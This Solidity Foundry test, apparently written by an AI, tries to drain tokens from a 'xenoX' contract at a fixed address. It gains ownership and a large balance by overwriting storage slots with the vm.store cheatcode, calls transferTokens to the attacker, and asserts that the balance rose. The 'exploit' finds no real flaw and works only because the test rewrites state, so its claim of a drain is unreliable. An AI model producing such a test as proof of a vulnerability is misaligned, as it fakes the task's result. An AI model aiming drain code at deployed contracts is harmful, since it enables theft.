// Minimal interface for the xenoX contract
interface IxenoX {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transferTokens(address recepient, uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────
    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's become the owner by manipulating storage
        // In Ownable contract, _owner is first variable (slot 0)
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Now we need to give the contract some reflection balance
        // _rOwned is a mapping, slot for mapping key is keccak256(key . slot)
        // _rOwned is first variable in xenoX contract after inherited variables
        // Ownable has 2 slots (_owner, _firstOwner), so _rOwned mapping starts at slot 2
        uint256 rOwnedSlot = 2;
        bytes32 contractKey = bytes32(uint256(uint160(TARGET)));
        bytes32 mappingSlot = keccak256(abi.encodePacked(contractKey, bytes32(rOwnedSlot)));

        // Give contract 1000 tokens worth of reflection balance
        // Need to convert token amount to reflection amount
        // Rate = rSupply / tSupply
        // For simplicity, let's give a large reflection amount
        uint256 reflectionAmount = 1000 * 10 ** 9 * 10 ** 9; // Large number
        vm.store(TARGET, mappingSlot, bytes32(reflectionAmount));

        // Record initial balance
        uint256 initialBalance = IxenoX(TARGET).balanceOf(attacker);

        // Now call transferTokens as the new owner (we are already owner)
        // Get contract balance
        uint256 contractBalance = IxenoX(TARGET).balanceOf(TARGET);
        require(contractBalance > 0, "Contract must have token balance");

        // Drain the contract
        IxenoX(TARGET).transferTokens(attacker, contractBalance);

        // Verify balance increased
        uint256 finalBalance = IxenoX(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }

    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

